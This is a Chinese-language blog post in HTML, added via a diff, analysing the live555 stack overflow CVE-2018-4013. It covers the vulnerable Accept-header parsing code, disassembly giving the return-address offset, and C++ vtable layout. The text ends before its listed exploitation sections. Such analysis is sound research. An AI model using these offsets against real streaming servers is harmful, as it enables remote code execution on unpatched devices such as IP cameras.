@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="http://localhost:4000/assets/fonts/fonts.css"/>
+<link rel="stylesheet" href="http://localhost:4000/assets/style.css"/>
+<link rel="stylesheet" href="http://localhost:4000/assets/js/lity.min.css"/>
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta property="og:site_name" content="极目楚天舒" />
+<meta 
+    property="og:title"
+    content="
+        
+            live555栈溢出漏洞分析
+        
+    " 
+/>
+
+<meta property="og:url" content="http://localhost:4000//userspace/2025/04/15/live555-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" />
+
+    <meta property="og:type" content="article" />
+
+
+
+    <meta property="fb:app_id" content="" />
+
+
+
+<title>
+    
+        live555栈溢出漏洞分析
+    
+</title>
+</head>
+<body class="index">
+    
+        <div class="page-container">
+            <aside class="main-sidebar">
+                <!-- 包含 TOC -->
+                <sidebar class="sidebar">
+<ul class="toc-list"><li><a href="#漏洞信息">漏洞信息</a></li><li><a href="#漏洞分析">漏洞分析</a><ul><li><a href="#调用关系">调用关系</a></li><li><a href="#漏洞原理">漏洞原理</a></li><li><a href="#c虚表函数调用">C++虚表函数调用</a></li></ul></li><li><a href="#漏洞利用">漏洞利用</a></li><li><a href="#重入位置怎么找">重入位置怎么找</a><ul><li><a href="#环境准备的问题">环境准备的问题</a></li><li><a href="#寄存器对齐问题">寄存器对齐问题</a></li></ul></li></ul></sidebar>
+            </aside>
+            <!-- 主内容区域 -->
+            <main class="main-content">
+                <header class="header">
+    <section class="logo">
+        <a href="http://localhost:4000/" class="logo__link">
+            
+                <h1>极目楚天舒</h1>
+            
+        </a>
+    </section>
+    <button id="menuToggle">
+        <div></div>
+        <div></div>
+        <div></div>
+    </button>
+    <nav class="menu">
+        
+<ul class="list primary">
+
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/linux_kernel.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/tux.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Linux kernel</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/linux_userspace.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/userspace.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Linux userspace</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/hardware.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/chip.svg"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Hardware</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/meltdown_spectre.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/meltdown_spectre.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Side Channel</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/riscv.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/riscv.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Riscv</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+</ul>
+    </nav>
+</header>
+                
+                <article class="post">
+
+    <div class="post__title">
+       live555栈溢出漏洞分析
+    </div>
+    <div class="post__meta"> 
+        <div class="post__meta__category">
+            
+                <p class="post__meta__category__title" style="background: var(--c-themeHueRed)">Userspace</p>
+            
+        </div>
+        <p class="post__meta__divider">·</p>
+        <div class="post__meta__date">
+            April 15, 2025
+        </div>
+        
+    </div>
+
+    
+
+    <div class="post__content">
+        <p>Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 <strong>RTSP/RTP/RTCP</strong> 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。</p>
+
+<h1 id="漏洞信息">漏洞信息</h1>
+
+<p>Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 <strong>RTSP/RTP/RTCP</strong> 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。</p>
+
+<p>漏洞编号：cve-2018-4013</p>
+
+<p>效果：攻击者可以获取远程shell</p>
+
+<p>内存控制能力：</p>
+
+<ul>
+  <li>没有NULL截断，可随意写入</li>
+  <li>栈上面的内容可控，无任何添加</li>
+  <li>溢出长度可控</li>
+  <li>没有内容过滤</li>
+</ul>
+
+<h1 id="漏洞分析">漏洞分析</h1>
+
+<h2 id="调用关系">调用关系</h2>
+
+<p><img src="/assets/posts/2025-04-15-live555栈溢出漏洞分析/live555.jpg" alt="live555.jpg" /></p>
+
+<h2 id="漏洞原理">漏洞原理</h2>
+
+<p>doEventLoop是处理网络输入的主逻辑，它是TaskScheduler对象的方法：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  
+  <span class="n">TaskScheduler</span><span class="o">*</span> <span class="n">scheduler</span> <span class="o">=</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">createNew</span><span class="p">();</span>
+  <span class="n">UsageEnvironment</span><span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">BasicUsageEnvironment</span><span class="o">::</span><span class="n">createNew</span><span class="p">(</span><span class="o">*</span><span class="n">scheduler</span><span class="p">);</span>
+  <span class="p">......</span>
+  <span class="n">env</span><span class="o">-&gt;</span><span class="n">taskScheduler</span><span class="p">().</span><span class="n">doEventLoop</span><span class="p">();</span> <span class="c1">// does not return</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>handleRequestBytes解析http请求的头部，把cookie部分保存在sessionCookie数组，accept部分保存在acceptStr数组中，两个数组长度都是200字节，其中acceptStr数组是溢出对象。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">RTSPServer</span><span class="o">::</span><span class="n">RTSPClientConnection</span><span class="o">::</span><span class="n">handleRequestBytes</span><span class="p">(</span><span class="kt">int</span> <span class="n">newBytesRead</span><span class="p">)</span> <span class="p">{</span>
+	<span class="p">......</span>
+	<span class="kt">char</span> <span class="n">sessionCookie</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">acceptStr</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>     <span class="c1">//溢出对象</span>
+  <span class="o">*</span><span class="n">fLastCRLF</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> 
+  <span class="n">parseSucceeded</span> <span class="o">=</span> <span class="n">parseHTTPRequestString</span><span class="p">(</span><span class="n">cmdName</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">cmdName</span><span class="p">,</span>
+					      <span class="n">urlSuffix</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">urlPreSuffix</span><span class="p">,</span>
+					      <span class="n">sessionCookie</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sessionCookie</span><span class="p">,</span>
+					      <span class="n">acceptStr</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">acceptStr</span><span class="p">);</span>
+	<span class="p">......</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>可以看到acceptStr数组到返回地址的距离是0x1c8，因为这里的栈变量是以rsp+0x6D8来索引的，也就是用的到返回地址的距离：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000407EE0 _ZN10RTSPServer20RTSPClientConnection18handleRequestBytesEi proc near
+.text:0000000000407EE0                                         <span class="p">;</span> DATA XREF: .data.rel.ro:0000000000464F68↓o
+.text:0000000000407EE0
+.text:0000000000407EE0 var_6D8         <span class="o">=</span> qword ptr <span class="nt">-6D8h</span>
+.text:0000000000407EE0 tmpPtr          <span class="o">=</span> qword ptr <span class="nt">-6D0h</span>
+.text:0000000000407EE0 var_6C8         <span class="o">=</span> qword ptr <span class="nt">-6C8h</span>
+.text:0000000000407EE0 newBytesRead    <span class="o">=</span> qword ptr <span class="nt">-6C0h</span>
+.text:0000000000407EE0 reuseConnection <span class="o">=</span> byte ptr <span class="nt">-6ADh</span>
+.text:0000000000407EE0 contentLength   <span class="o">=</span> dword ptr <span class="nt">-6ACh</span>
+.text:0000000000407EE0 cmdName         <span class="o">=</span> byte ptr <span class="nt">-6A8h</span>
+.text:0000000000407EE0 urlPreSuffix    <span class="o">=</span> byte ptr <span class="nt">-5D8h</span>
+.text:0000000000407EE0 urlSuffix       <span class="o">=</span> byte ptr <span class="nt">-508h</span>
+.text:0000000000407EE0 cseq            <span class="o">=</span> byte ptr <span class="nt">-438h</span>
+.text:0000000000407EE0 sessionIdStr    <span class="o">=</span> byte ptr <span class="nt">-368h</span>
+.text:0000000000407EE0 sessionCookie   <span class="o">=</span> byte ptr <span class="nt">-298h</span>
+.text:0000000000407EE0 acceptStr       <span class="o">=</span> byte ptr <span class="nt">-1C8h</span>     <span class="p">;</span> 到返回地址的距离为0x1c8
+.text:0000000000407EE0
+.text:0000000000407EE0 this <span class="o">=</span> rdi                              <span class="p">;</span> RTSPServer::RTSPClientConnection <span class="k">*</span>const
+.text:0000000000407EE0 newBytesRead_0 <span class="o">=</span> rsi                    <span class="p">;</span> int
+.text:0000000000407EE0 <span class="p">;</span> __unwind <span class="o">{</span>
+.text:0000000000407EE0                 endbr64
+.text:0000000000407EE4                 push    r15
+.text:0000000000407EE6                 mov     r15, this
+.text:0000000000407EE9                 push    r14
+.text:0000000000407EEB                 push    r13
+.text:0000000000407EED                 mov     r13d, esi
+.text:0000000000407EF0                 push    r12
+.text:0000000000407EF2                 push    rbp
+.text:0000000000407EF3                 push    rbx
+.text:0000000000407EF4                 sub     rsp, 6A8h
+.text:0000000000407EFB                 add     dword ptr <span class="o">[</span>this+9C90h], 1
+.text:0000000000407F02                 mov     r9d, <span class="o">[</span>this+9C68h]
+.text:0000000000407F09                 <span class="nb">test    </span>esi, esi
+.text:0000000000407F0B                 js      loc_4082C6
+.text:0000000000407F11                 xor     eax, eax
+.text:0000000000407F13 numBytesRemaining <span class="o">=</span> rax                 <span class="p">;</span> int
+.text:0000000000407F13                 mov     r12d, r13d
+.text:0000000000407F16                 cmp     r13d, r9d
+.text:0000000000407F19                 jnb     loc_4082C6
+.text:0000000000407F1F this <span class="o">=</span> r15                              <span class="p">;</span> RTSPServer::RTSPClientConnection <span class="k">*</span>const
+.text:0000000000407F1F newBytesRead_0 <span class="o">=</span> r12                    <span class="p">;</span> int
+.text:0000000000407F1F                 nop
+.text:0000000000407F20
+.text:0000000000407F20 loc_407F20:                             <span class="p">;</span> CODE XREF: RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+3E0↓j
+.text:0000000000407F20                 mov     edx, <span class="o">[</span>this+9C64h]
+.text:0000000000407F27                 lea     rbx, <span class="o">[</span>this+rdx+24h]
+.text:0000000000407F2C ptr <span class="o">=</span> rbx                               <span class="p">;</span> unsigned __int8 <span class="k">*</span>
+.text:0000000000407F2C                 movsxd  rdx, r13d
+.text:0000000000407F2F                 mov     byte ptr <span class="o">[</span>ptr+rdx], 0
+.text:0000000000407F33                 <span class="nb">test    </span>eax, eax
+.text:0000000000407F35                 jz      loc_408318
+.text:0000000000407F3B                 sub     rsp, 8
+.text:0000000000407F3F                 mov     rdi, cs:stderr@@GLIBC_2_2_5
+.text:0000000000407F46                 mov     r9d, r13d
+.text:0000000000407F49                 xor     eax, eax
+.text:0000000000407F4B                 push    ptr
+.text:0000000000407F4C                 lea     rdx, aRtspclientconn <span class="p">;</span> <span class="s2">"RTSPClientConnection[%p]::handleRequest"</span>...
+.text:0000000000407F53                 mov     rcx, this
+.text:0000000000407F56                 mov     esi, 1
+.text:0000000000407F5B                 lea     r8, aProcessing <span class="p">;</span> <span class="s2">"processing"</span>
+.text:0000000000407F62                 call    ___fprintf_chk
+.text:0000000000407F67                 mov     r9d, <span class="o">[</span>this+9CD8h]
+.text:0000000000407F6E                 pop     rax
+.text:0000000000407F6F                 pop     rdx
+.text:0000000000407F70
+.text:0000000000407F70 loc_407F70:                             <span class="p">;</span> CODE XREF: RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+482↓j
+.text:0000000000407F70                                         <span class="p">;</span> RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+6B8↓j
+.text:0000000000407F70                 <span class="nb">test    </span>r9d, r9d
+.text:0000000000407F73                 jnz     short loc_407FE0
+.text:0000000000407F75                 mov     rax, <span class="o">[</span>this+9C88h]
+.text:0000000000407F7C                 lea     rbp, <span class="o">[</span>this+24h]
+.text:0000000000407F80                 lea     r11, <span class="o">[</span>rax+2]
+.text:0000000000407F84                 movsxd  rax, r13d
+.text:0000000000407F87                 cmp     rbp, r11
+.text:0000000000407F8A                 mov     <span class="o">[</span>rsp+6D8h+newBytesRead], rax
+.text:0000000000407F8F                 lea     rax, <span class="o">[</span>ptr+rax-1]
+.text:0000000000407F94                 cmovnb  r11, rbp
+</code></pre></div></div>
+
+<p>acceptStr以参数透传的方式传递给漏洞lookForHeader：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Boolean</span> <span class="n">RTSPServer</span><span class="o">::</span><span class="n">RTSPClientConnection</span><span class="o">::</span><span class="n">parseHTTPRequestString</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">resultCmdName</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">resultCmdNameMaxSize</span><span class="p">,</span>
+								 <span class="kt">char</span><span class="o">*</span> <span class="n">urlSuffix</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">urlSuffixMaxSize</span><span class="p">,</span>
+								 <span class="kt">char</span><span class="o">*</span> <span class="n">sessionCookie</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">sessionCookieMaxSize</span><span class="p">,</span>
+								 <span class="kt">char</span><span class="o">*</span> <span class="n">acceptStr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">acceptStrMaxSize</span><span class="p">)</span> <span class="p">{</span>
+								 
+  <span class="p">......</span>
+  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"x-sessioncookie"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reqStr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">reqStrSize</span><span class="o">-</span><span class="n">i</span><span class="p">,</span> <span class="n">sessionCookie</span><span class="p">,</span> <span class="n">sessionCookieMaxSize</span><span class="p">);</span>
+  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"Accept"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reqStr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">reqStrSize</span><span class="o">-</span><span class="n">i</span><span class="p">,</span> <span class="n">acceptStr</span><span class="p">,</span> <span class="n">acceptStrMaxSize</span><span class="p">);</span>
+  
+  <span class="k">return</span> <span class="n">True</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>漏洞的原因在于攻击者可以在一次http请求中构造多个accept字段，这多个accept字段都会被拷贝到acceptStr[200]数组中，而lookForHeader函数仅对单次拷贝Accept的长度做了限制不超过200：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">lookForHeader</span><span class="p">(</span><span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">headerName</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">source</span><span class="p">,</span> 
+						<span class="kt">unsigned</span> <span class="n">sourceLen</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">resultStr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">resultMaxSize</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">resultStr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="n">headerNameLen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">headerName</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">sourceLen</span><span class="o">-</span><span class="n">headerNameLen</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+	  <span class="c1">//循环解析"Accept:"字符串，可以解析多个Accept字段</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">headerName</span><span class="p">,</span> <span class="n">headerNameLen</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">headerNameLen</span><span class="p">]</span> <span class="o">==</span> <span class="sc">':'</span><span class="p">)</span> 
+    <span class="p">{</span>
+      <span class="c1">//找到了accept头.  跳过空白和制表符</span>
+	    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">+=</span> <span class="n">headerNameLen</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sourceLen</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span> <span class="o">||</span> <span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\t'</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{}</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">sourceLen</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
+				<span class="k">if</span> <span class="p">(</span><span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\r'</span> <span class="o">||</span> <span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
+			  <span class="c1">// 字符串拷贝</span>
+				  <span class="k">if</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&gt;</span> <span class="n">resultMaxSize</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>  <span class="c1">//resultMaxSize限制为200, 但这个仅仅是针对单次</span>
+																						 <span class="c1">//的复制过程，如果控制每个Accept字段长度不超过200</span>
+																						 <span class="c1">//那么就可以反复拷贝造成溢出</span>
+				  <span class="c1">// 标记源字符串中的拷贝起始位置</span>
+				  <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">resultSource</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+				  <span class="c1">// 标记源字符串中的拷贝结束位置</span>
+				  <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">resultSourceEnd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+				  <span class="c1">// 位于下标 i,j之间的内容拷贝到acceptStr数组中</span>
+				  <span class="k">while</span> <span class="p">(</span><span class="n">resultSource</span> <span class="o">&lt;</span> <span class="n">resultSourceEnd</span><span class="p">)</span> <span class="o">*</span><span class="n">resultStr</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">resultSource</span><span class="o">++</span><span class="p">;</span> <span class="c1">//漏洞点</span>
+				  <span class="o">*</span><span class="n">resultStr</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+				  <span class="k">break</span><span class="p">;</span>
+				<span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>漏洞的效果是覆盖handleRequestBytes函数到incomingRequestHandle的返回地址。</p>
+
+<h2 id="c虚表函数调用">C++虚表函数调用</h2>
+
+<p>以doEventLoop函数的调用为例，该函数是TaskScheduler对象的方法，而 UsageEnvironment对象又包含了一个TaskScheduler对象：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  
+  <span class="n">TaskScheduler</span><span class="o">*</span> <span class="n">scheduler</span> <span class="o">=</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">createNew</span><span class="p">();</span>
+  <span class="n">UsageEnvironment</span><span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">BasicUsageEnvironment</span><span class="o">::</span><span class="n">createNew</span><span class="p">(</span><span class="o">*</span><span class="n">scheduler</span><span class="p">);</span>
+  <span class="p">......</span>
+  <span class="n">env</span><span class="o">-&gt;</span><span class="n">taskScheduler</span><span class="p">().</span><span class="n">doEventLoop</span><span class="p">();</span> <span class="c1">// does not return</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">class</span> <span class="n">TaskScheduler</span> <span class="p">{</span>
+	<span class="nl">public:</span>
+	  <span class="k">virtual</span> <span class="o">~</span><span class="n">TaskScheduler</span><span class="p">();</span>  <span class="c1">// 析构函数</span>
+	  <span class="p">......</span>
+	  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">moveSocketHandling</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldSocketNum</span><span class="p">,</span> <span class="kt">int</span> <span class="n">newSocketNum</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">doEventLoop</span><span class="p">(</span><span class="kt">char</span> <span class="k">volatile</span><span class="o">*</span> <span class="n">watchVariable</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="nl">protected:</span>
+	  <span class="n">TaskScheduler</span><span class="p">();</span> <span class="c1">// 构造函数</span>
+<span class="p">};</span>
+
+<span class="n">class</span> <span class="n">UsageEnvironment</span> <span class="p">{</span>
+	<span class="nl">public:</span>
+	  <span class="n">Boolean</span> <span class="n">reclaim</span><span class="p">();</span>
+	  <span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">taskScheduler</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span><span class="k">return</span> <span class="n">fScheduler</span><span class="p">;}</span>
+	<span class="p">......</span>
+
+	<span class="nl">protected:</span>
+	  <span class="n">UsageEnvironment</span><span class="p">(</span><span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">scheduler</span><span class="p">);</span> <span class="c1">// 构造函数</span>
+	  <span class="k">virtual</span> <span class="o">~</span><span class="n">UsageEnvironment</span><span class="p">();</span> <span class="c1">// 析构函数</span>
+
+	<span class="nl">private:</span>
+	  <span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">fScheduler</span><span class="p">;</span>   <span class="c1">// 包含了一个TaskScheduler对象,保存的是指针</span>
+<span class="p">};</span>
+     
+</code></pre></div></div>
+
+<p>从反汇编的角度来看env-&gt;taskScheduler().doEventLoop()调用过程：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004052DF loc_4052DF:                             <span class="p">;</span> CODE XREF: main+5D5↓j
+.text:00000000004052DF    mov   rax, cs:env    <span class="p">;</span> 解引用env对象
+.text:00000000004052E6    xor   esi, esi       <span class="p">;</span> <span class="nb">env</span>+0x18的位置保存TaskScheduler对象指针
+.text:00000000004052E8    mov   rdi, <span class="o">[</span>rax+18h] <span class="p">;</span> fScheduler对象地址作为第一个参数, this
+.text:00000000004052EC    mov   rax, <span class="o">[</span>rdi]     <span class="p">;</span> 对象的第一个8字节保存的函数虚表地址
+.text:00000000004052EF    call  qword ptr <span class="o">[</span>rax+38h] <span class="p">;</span> 虚表中index为7的槽位是doEventLoop函数指针
+</code></pre></div></div>
+
+<p>这段代码对应的F5：</p>
+
+<p>可以看到this就是对象本身的指针，this默认作为方法的第一个参数传递给rdi寄存器，方法定义中的其他参数往后顺延。</p>
+
+<p><img src="/assets/posts/2025-04-15-live555栈溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-04-15_171433.png" alt="批注 2025-04-15 171433.png" /></p>
+
+<p>观察数据结构可以看到UsageEnvironment对象和TaskScheduler对象的第0个字节都是虚表指针。</p>
+
+<p>UsageEnvironment对象偏移0x18字节的位置保存了TaskScheduler对象的指针。</p>
+
+<p>每一次对象方法的调用都是以对象的地址作为this指针，传递给rdi寄存器，作为对象方法的第一个参数。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000 UsageEnvironment struc <span class="p">;</span> <span class="o">(</span><span class="nv">sizeof</span><span class="o">=</span>0x20, <span class="nv">align</span><span class="o">=</span>0x8, copyof_37<span class="o">)</span>
+00000000                                         <span class="p">;</span> XREF: BasicUsageEnvironment0/r
+00000000 _vptr_UsageEnvironment dq ?             <span class="p">;</span> offset
+00000008 liveMediaPriv   dq ?                    <span class="p">;</span> offset
+00000010 groupsockPriv   dq ?                    <span class="p">;</span> offset
+00000018 fScheduler      dq ?                    <span class="p">;</span> offset
+00000020 UsageEnvironment ends
+00000020
+00000000 <span class="p">;</span> <span class="nt">---------------------------------------------------------------------------</span>
+00000000
+00000000 TaskScheduler   struc <span class="p">;</span> <span class="o">(</span><span class="nv">sizeof</span><span class="o">=</span>0x8, <span class="nv">align</span><span class="o">=</span>0x8, copyof_44<span class="o">)</span>
+00000000 _vptr_TaskScheduler dq ?                <span class="p">;</span> offset
+00000008 TaskScheduler   ends
+00000008
+</code></pre></div></div>
+
+<p>函数虚表是被硬编码在可执行文件中的，其中包含了对象的类型信息和函数指针表。</p>
+
+<p>函数指针表的位置是从0x46AA08开始，该地址保存在对象中，作为方法调用时候的索引基地址，也就是每个对象开头的8个字节：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">A9F8</span> <span class="p">;</span> <span class="err">`</span><span class="n">vtable</span> <span class="k">for</span><span class="err">'</span><span class="n">BasicTaskScheduler</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">A9F8</span> <span class="n">_ZTV18BasicTaskScheduler</span> <span class="n">dq</span> <span class="mi">0</span>           <span class="p">;</span> <span class="n">offset</span> <span class="n">to</span> <span class="n">this</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA00</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZTI18BasicTaskScheduler</span> <span class="p">;</span> <span class="err">`</span><span class="n">typeinfo</span> <span class="k">for</span><span class="err">'</span><span class="n">BasicTaskScheduler</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span> <span class="n">off_46AA08</span>      <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskSchedulerD2Ev</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span><span class="o">+</span><span class="mi">4</span><span class="err">↑</span><span class="n">o</span>
